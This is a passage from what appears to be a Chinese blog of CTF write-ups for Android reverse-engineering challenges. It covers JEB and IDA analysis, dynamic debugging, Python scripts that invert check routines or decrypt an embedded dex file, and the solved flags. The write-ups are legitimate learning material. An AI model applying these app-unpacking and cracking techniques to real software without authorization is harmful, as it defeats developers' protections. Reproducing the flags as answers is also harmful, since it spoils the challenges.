class="number">16</span>]]</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">            resp.append(i)</span><br><span class="line">         integral_part = integral_part[<span class="number">4</span>:]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">         remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[nums * <span class="number">4</span>:])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(remain_part[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(remain - <span class="number">1</span>)]</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">         resp.append(i)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_base64_str</span>(<span class="params">b_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b_str) % <span class="number">4</span>:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> b_str:</span><br><span class="line">     <span class="keyword">if</span> m != <span class="string">&quot;=&quot;</span> <span class="keyword">and</span> m <span class="keyword">not</span> <span class="keyword">in</span> base64_charset:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">     local_base64 = <span class="string">&quot;QAoOQMPFks1BsB7cbM3TQsXg30i9g3==&quot;</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;使用本地base64解密：&#x27;</span>, decode(local_base64).decode())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用本地base64解密： flag&#123;just_ANot#er_@p3&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="7-easy-so"><a href="#7-easy-so" class="headerlink" title="7. easy-so"></a>7. easy-so</h1><p>运行程序。</p><img src="/posts/9f62af2/7.1.png" class="" title="运行程序"><p>看题目，肯定有so文件，载入AK发现4种架构都有，可以快乐地玩耍了。</p><p>载入jeb分析源码。</p><img src="/posts/9f62af2/7.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/7.3.png" class="" title="jeb分析"><p>我们需要做的就是将CheckString方法的返回值为1。解包，用x86架构的so文件载入IDA。因为我用的模拟器是x86架构的。</p><img src="/posts/9f62af2/7.4.png" class="" title="IDA分析"><p>这个与6的题目考点几乎一模一样，只是没了变种Base64的过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f72c5a36569418a20907b55be5bf95ad</span><br><span class="line"></span><br><span class="line"># i与i+1对换</span><br><span class="line">7fc2a5636549812a90705bb55efb59da</span><br><span class="line"></span><br><span class="line"># 前16位与后16位对换</span><br><span class="line">90705bb55efb59da7fc2a5636549812a</span><br></pre></td></tr></table></figure><p>拿去程序里运行验证一下，验证通过。</p><img src="/posts/9f62af2/7.5.png" class="" title="验证通过"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;90705bb55efb59da7fc2a5636549812a&#125;</span><br></pre></td></tr></table></figure><h1 id="8-easyjava"><a href="#8-easyjava" class="headerlink" title="8. easyjava"></a>8. easyjava</h1><p>运行一下程序。</p><img src="/posts/9f62af2/8.1.png" class="" title="运行程序"><p>载入jeb分析：</p><img src="/posts/9f62af2/8.2.png" class="" title="jeb分析"><p>将b类和a类所有方法都分析一遍，反正后面也要用到。</p><img src="/posts/9f62af2/8.3.png" class="" title="b类"><img src="/posts/9f62af2/8.4.png" class="" title="b类"><img src="/posts/9f62af2/8.5.png" class="" title="a类"><img src="/posts/9f62af2/8.6.png" class="" title="a类"><p>回到MainActivity类，b.b和a.a的作用一样，都是以参数为边界，对换各自的c整形列表，所以v4和v5都应该是对换后的列表。经过分析a类和b类发现并没有增加或减少原本的长度，所以v2的长度就应该等于v3的长度，v3的长度从字符串中可以计算到是12，所以循环要经历12次。</p><p>以v2索引值为0的值为例，将v2索引值为0的值传入b.a方法，如果这个值可以转换成小写字母，则把b.b小写字母表中相同的小写字母的索引值取出，与a列表(也就是v4)的数组元素对比，如果取出的索引值与a列表中某个元素相同，则返回元素的索引值。更新b.a列表和b.b小写字母表，都是首位放最末位。将返回的a列表元素的索引值作为参数传入a.a方法，如果这个形参与a列表中(也就是v5)的元素相同，取出这个元素的索引值，作为a.b小写字母表中的索引，返回该索引的元素，也就是“w”。</p><p>用Python写出来相当于<code>a_alphabet[v5.index(v4.index(b_alphabet.index(ans[0])))] = w</code></p><p>现在我们要做的就是把这个过程逆回来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v4 = [<span class="number">17</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">22</span>,<span class="number">1</span>,<span class="number">16</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">18</span>,<span class="number">2</span>,<span class="number">24</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">25</span>]</span><br><span class="line">v5 = [<span class="number">21</span>,<span class="number">4</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">17</span>,<span class="number">6</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">18</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">22</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">16</span>]</span><br><span class="line">flag = <span class="string">&quot;wigwrkaugala&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">b_alphabet = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line">a_alphabet = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    halflag = a_alphabet.index(i)</span><br><span class="line">    ans += b_alphabet[v4[v5[halflag]]]</span><br><span class="line">    temp = v4[<span class="number">0</span>]</span><br><span class="line">    v4.pop(<span class="number">0</span>)</span><br><span class="line">    v4.append(temp)</span><br><span class="line">    temp = b_alphabet[<span class="number">0</span>]</span><br><span class="line">    b_alphabet.pop(<span class="number">0</span>)</span><br><span class="line">    b_alphabet.append(temp)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">venividivkcr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/posts/9f62af2/8.7.png" class="" title="运行成功"><p>嘤嘤嘤终于成功了，在做的时候看漏了很多细节，所以正确的flag一直出不来，还是要耐心一点！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;venividivkcr&#125;</span><br></pre></td></tr></table></figure><h1 id="9-Ph0en1x-100"><a href="#9-Ph0en1x-100" class="headerlink" title="9. Ph0en1x-100"></a>9. Ph0en1x-100</h1><img src="/posts/9f62af2/9.1.png" class="" title="运行程序"><p>载入AK，看到有lib文件。载入jeb分析源码。</p><img src="/posts/9f62af2/9.2.png" class="" title="jeb分析"><p>而getFlag和encrypt都是Native方法，需要在so文件查看详细内容。将程序解包，拿x86目录下的so文件载入IDA，查看getFlag和encrypt方法。</p><p>encrypt方法就是将输入的字符串中的每个字符的ASCII码都减1。</p><img src="/posts/9f62af2/9.3.png" class="" title="IDA分析"><p>getFlag方法看得就有点懵逼了，如果静态分析是在困难的话，可以考虑动态调试。</p><img src="/posts/9f62af2/9.4.png" class="" title="IDA分析"><p>动态调试需要满足<code>android:debuggable=&quot;true&quot;</code>，没有就要在AK中编辑添加，重新编译签名。</p><p>动态调试方法可看 <a href="https://v5le0n9.github.io/posts/15be101a.html?highlight=and#9-IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81">https://v5le0n9.github.io/posts/15be101a.html?highlight=and#9-IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81</a> 我就在这偷下懒了。</p><p>刚才静态分析中，很明显看到一个循环，那我们就在循环的下一句下断点，在程序中输入字符串点击按钮，IDA停在断点处。此时，查看寄存器窗口EDI的值，点击小箭头，跟随地址。</p><img src="/posts/9f62af2/9.5.png" class="" title="IDA动态调试"><img src="/posts/9f62af2/9.6.png" class="" title="IDA动态调试"><p>到了这里还没行，循环解决了但getFlag方法还未结束。F8步过观察字符串的变化。运行到快要结束时字符串已经不再变化了。在F8步过的过程中，发现<code>.</code>变成了<code>e</code>。所以正确的getFlag的返回值应该为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|</span><br></pre></td></tr></table></figure><p>所以我们输入的字符串中每个字符-1就是上面这个字符串。编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag&#123;Ar3_y0u_go1nG_70_scarborough_Fair&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="10-黑客精神"><a href="#10-黑客精神" class="headerlink" title="10. 黑客精神"></a>10. 黑客精神</h1><p>运行程序，注册码保存后直接退出。</p><img src="/posts/9f62af2/10.1.png" class="" title="运行程序"><p>载入AK，有so文件，因为没有x86目录，如果要动态调试的话就要开我那个慢得要死的AS原生模拟器了。</p><p>载入jeb，分析源码：</p><img src="/posts/9f62af2/10.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/10.3.png" class="" title="jeb分析"><img src="/posts/9f62af2/10.4.png" class="" title="jeb分析"><img src="/posts/9f62af2/10.5.png" class="" title="jeb分析"><p>看到有Log语句，赶紧打开AS连接上模拟器运行一下看看Log。程序一进去就显示m=0，然后再m=Xman。</p><img src="/posts/9f62af2/10.6.png" class="" title="AS中Logcat窗口"><p>说明程序在打开窗口前就已经载入so文件读取m的值，但它是静态的，如果我们注册过的话，程序会读取m=1，不会让我们再次注册。so文件的onCreate方法中，第一句就是初始化SN，所以m的值应该是在native方法initSN中存着。</p><p>将so文件载入IDA，在导出表里找不到initSN方法，也找不到所有native方法，但看到了JNI_Onload，说明整个过程都是在JNI_Onload里动态完成的。</p><img src="/posts/9f62af2/10.7.png" class="" title="IDAExport表"><p>点进JNI_Onload函数，查看源码：</p><img src="/posts/9f62af2/10.8.png" class="" title="IDA分析"><img src="/posts/9f62af2/10.9.png" class="" title="IDA分析"><img src="/posts/9f62af2/10.10.png" class="" title="IDA分析"><p>所以<code>EoPAoY62@ElRD</code>应该就是注册码，但输入发现不对…Logcat窗口还是显示m=0。</p><p>那继续分析saveSN。</p><img src="/posts/9f62af2/10.11.png" class="" title="IDA分析"><p>现在可以捋一下思路了，<code>W3_arE_whO_we_ARE</code>是要加密的字符串，<code>EoPAoY62@ElRD</code>相当于密钥，作为参数传入saveSN。v7存着的就是密钥。</p><p>把这个加密算法用Python写一遍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;W3_arE_whO_we_ARE&quot;</span></span><br><span class="line">flagarr = <span class="built_in">list</span>(flag)</span><br><span class="line">key = <span class="string">&quot;EoPAoY62@ElRD&quot;</span></span><br><span class="line">keyarr = <span class="built_in">list</span>(key)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">v9 = <span class="number">2016</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">        v9 = (v9 + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">        v11 = flagarr[v9 + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        v9 = (v9 + <span class="number">7</span>) % <span class="number">15</span></span><br><span class="line">        v11 = flagarr[v9 + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v9 = (v9 + <span class="number">3</span>) % <span class="number">13</span></span><br><span class="line">        v11 = flagarr[v9 + <span class="number">3</span>]</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keyarr[i]) ^ <span class="built_in">ord</span>(v11))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">201608Am!2333</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>最后一个work方法，查看它的内存，里面包含着flag的格式。</p><img src="/posts/9f62af2/10.12.png" class="" title="IDA分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xman&#123;201608Am!2333&#125;</span><br></pre></td></tr></table></figure><h1 id="11-APK逆向"><a href="#11-APK逆向" class="headerlink" title="11. APK逆向"></a>11. APK逆向</h1><p>同Bugku的mobile1。<a href="https://v5le0n9.github.io/posts/17c1c819.html#2-mobile1">https://v5le0n9.github.io/posts/17c1c819.html#2-mobile1</a> </p><h1 id="12-人民的名义-抓捕赵德汉1-200"><a href="#12-人民的名义-抓捕赵德汉1-200" class="headerlink" title="12. 人民的名义-抓捕赵德汉1-200"></a>12. 人民的名义-抓捕赵德汉1-200</h1><p>下载下来的是jar包，使用命令<code>jar -xvf 1-200.jar</code>解压jar包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop&gt;jar -xvf 1-200.jar</span><br><span class="line">  已解压: META-INF/MANIFEST.MF</span><br><span class="line">  已解压: CheckPassword.class</span><br><span class="line">  已解压: CheckInterface.class</span><br><span class="line">  已解压: ClassEnc</span><br><span class="line">  已解压: .project</span><br><span class="line">  已解压: .classpath</span><br><span class="line">  已解压: newClassName.class</span><br></pre></td></tr></table></figure><p>在AS或eclipse中创建一个项目，将jar包中的<code>.class</code>文件放到项目的class目录下即可查看源码。</p><img src="/posts/9f62af2/12.2.png" class="" title="查看源码"><img src="/posts/9f62af2/12.3.png" class="" title="查看源码"><img src="/posts/9f62af2/12.1.png" class="" title="查看源码"><img src="/posts/9f62af2/12.4.png" class="" title="查看源码"><p>这个MD5解出来是<code>monkey99</code>，拿去试了一下，发现flag就是这个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;monkey99&#125;</span><br></pre></td></tr></table></figure><h1 id="13-基础android"><a href="#13-基础android" class="headerlink" title="13. 基础android"></a>13. 基础android</h1><img src="/posts/9f62af2/13.1.png" class="" title="运行程序"><p>载入AK没什么发现，载入jeb分析源码。</p><img src="/posts/9f62af2/13.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/13.3.png" class="" title="jeb分析"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">base = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&quot;-+_&lt;&gt;?/\|&#123;&#125;()!@#$%^&amp;*~`&quot;</span></span><br><span class="line"><span class="built_in">len</span> = <span class="number">12</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> base:</span><br><span class="line">        s1 = <span class="number">255</span>-i-<span class="number">100</span>-<span class="built_in">ord</span>(j)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="number">48</span>:</span><br><span class="line">            ans += j</span><br><span class="line"><span class="built_in">print</span> (ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">kjihgfedcba`</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>拿到密码后继续去到第二关。</p><img src="/posts/9f62af2/13.4.png" class="" title="jeb分析"><p>那就再看看这个程序还开了哪个类我们还没有分析。<code>GetAndChange</code>和<code>NextContent</code>我们还没有分析，进去看看。</p><img src="/posts/9f62af2/13.5.png" class="" title="jeb分析"><img src="/posts/9f62af2/13.6.png" class="" title="jeb分析"><img src="/posts/9f62af2/13.7.png" class="" title="jeb分析"><p>之后再也没有任何操作了，我们已经看到图片了，所以<code>NextContent</code>不是关键类。返回到<code>GetAndChange</code>类，找一下<code>BroadcastReceiver</code>是干什么用的。</p><p><code>BroadcastReceiver</code>详解：<a href="https://blog.csdn.net/huiblog/article/details/53234544">https://blog.csdn.net/huiblog/article/details/53234544</a> </p><img src="/posts/9f62af2/13.8.png" class="" title="croadcastreceier静态注册"><p>回到<code>Manifest</code>发现果然有静态注册。</p><img src="/posts/9f62af2/13.9.png" class="" title="静态注册"><p>将<code>android.is.very.fun</code>作为显示码输入，但我点击按钮没有任何反应…但是之前不是分析<code>time_2.zip</code>转换为图片嘛，直接解压不行，因为它本来就不是zip压缩包。所以将后缀名修改为jpg就可以看到图片了。</p><img src="/posts/9f62af2/13.11.png" class="" title="jfif"><img src="/posts/9f62af2/13.10.png" class="" title="flag"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;08067-wlecome&#125;</span><br></pre></td></tr></table></figure><h1 id="14-easy-dex"><a href="#14-easy-dex" class="headerlink" title="14. easy-dex"></a>14. easy-dex</h1><p>在模拟器运行，点一下屏幕就一直在闪，五颜六色地闪。</p><p>载入AK，没有找到smali文件，但有一个so文件。并且在<code>AndroidManifest.xml</code>文件中能看到有两个丢失的但程序需要的smali文件。<code>MainActivity</code>和<code>NativeActivity</code>。<code>MainActivity</code>大家都知道啦，一般是安卓程序的入口。但我们发现这个程序的入口是<code>NativeActivity</code>，这个是什么呢？</p><img src="/posts/9f62af2/14.4.png" class="" title="两个smali文件"><p>写android纯c++的程序需要用到<code>NativeActivity</code>，这个<code>NativeActivity</code>就是一个一般的java类， 和普通的activity没有区别。<code>NativeActivity</code> 是android sdk自带的一个activity。android的纯c++的程序也是需要一个java虚拟机来运行的。<code>NativeActivity</code>通过<code>native_app_glu</code>来启动我们的c++线程，传递各种activity事件给c++代码。<code>native_app_glu</code>在ndk的<code>sources\android</code>目录里面，将<code>native_app_glu</code>当作我们工程的静态库，这个静态库里面封装好了，会创建一个线程，这个线程里面会调用一个<code>android_main(android_app* pApplication)</code>的函数，因此，我们c++这边的入口函数就是<code>android_main()</code>。我们在这个<code>android_main()</code>函数里面的任务就是进行消息循环，做各种任务。</p><p>解包，载入IDA查看so文件。找到<code>android_main</code>函数，点进去。</p><img src="/posts/9f62af2/14.1.png" class="" title="IDA分析"><p>也就是说要在10s内要摇100次手机。</p><img src="/posts/9f62af2/14.2.png" class="" title="IDA分析"><img src="/posts/9f62af2/14.3.png" class="" title="IDA分析"><p>看了个大概，再详细分析代码。</p><img src="/posts/9f62af2/14.5.png" class="" title="IDA分析"><img src="/posts/9f62af2/14.6.png" class="" title="IDA分析"><img src="/posts/9f62af2/14.7.png" class="" title="IDA分析"><p>所以我们首先取出<code>unk_7004</code>里面的加密数据，再将它解密，再解压缩得出dex内容将它写入文件中。</p><p>File -&gt; Script commond，选择Python，编写ida dump脚本将数据提取出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x7004</span></span><br><span class="line">size = <span class="number">0x3CA10</span></span><br><span class="line">file2Write = <span class="string">&#x27;.\\cipherdata&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file2Write,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(get_bytes(addr,size))</span><br></pre></td></tr></table></figure><p>在so文件的同目录下就会生成一个<code>cipherdata</code>文件。接下来给这个文件进行解密操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">file2Read = <span class="string">&#x27;.\\cipherdata&#x27;</span></span><br><span class="line">file2Write = <span class="string">&#x27;.\\easydex.dex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file2Read, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f2R:</span><br><span class="line">    data = <span class="built_in">list</span>(f2R.read())</span><br><span class="line">    size = <span class="number">0x3CA10</span></span><br><span class="line">    times = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#10次1组</span></span><br><span class="line">        <span class="keyword">if</span> times &lt;= <span class="number">89</span>:</span><br><span class="line">            timesDivide10 = <span class="built_in">int</span>(times / <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#10字节1组</span></span><br><span class="line">            <span class="keyword">if</span> times % <span class="number">10</span> == <span class="number">9</span>:</span><br><span class="line">                sizesDivide10 = <span class="built_in">int</span>(size / <span class="number">10</span>)</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(sizesDivide10):</span><br><span class="line">                    data[sizesDivide10 * timesDivide10 + i] ^= times</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">#次数为89次时</span></span><br><span class="line">                <span class="keyword">if</span> times == <span class="number">89</span>:</span><br><span class="line">                    j = (timesDivide10 + <span class="number">1</span>) * sizesDivide10</span><br><span class="line">                    <span class="keyword">while</span> j &lt; size:</span><br><span class="line">                        data[j] ^= <span class="number">89</span></span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解压数据</span></span><br><span class="line">data = zlib.decompress(<span class="built_in">bytes</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断解压出的数据是否是dex格式</span></span><br><span class="line"><span class="built_in">type</span> = data[<span class="number">0</span>:<span class="number">3</span>].decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;dex&#x27;</span>:</span><br><span class="line">    <span class="comment">#将数据写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file2Write, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2W:</span><br><span class="line">        f2W.write(data)</span><br></pre></td></tr></table></figure><p>将dex文件载入jeb，就可以查看这个程序的<code>MainActivity</code>类了。</p><img src="/posts/9f62af2/14.8.png" class="" title="jeb分析"><img src="/posts/9f62af2/14.9.png" class="" title="jeb分析"><img src="/posts/9f62af2/14.10.png" class="" title="jeb分析"><img src="/posts/9f62af2/14.11.png" class="" title="jeb分析"><img src="/posts/9f62af2/14.12.png" class="" title="jeb分析"><p>那么，先找密钥。密钥的id号为<code>2131099683</code>，转换成十六进制为<code>0x7F060023</code>。将dex重命名为<code>classes.dex</code>放到解包目录下，重打包。解包目录下就会生成一个<code>bulid</code>目录。</p><img 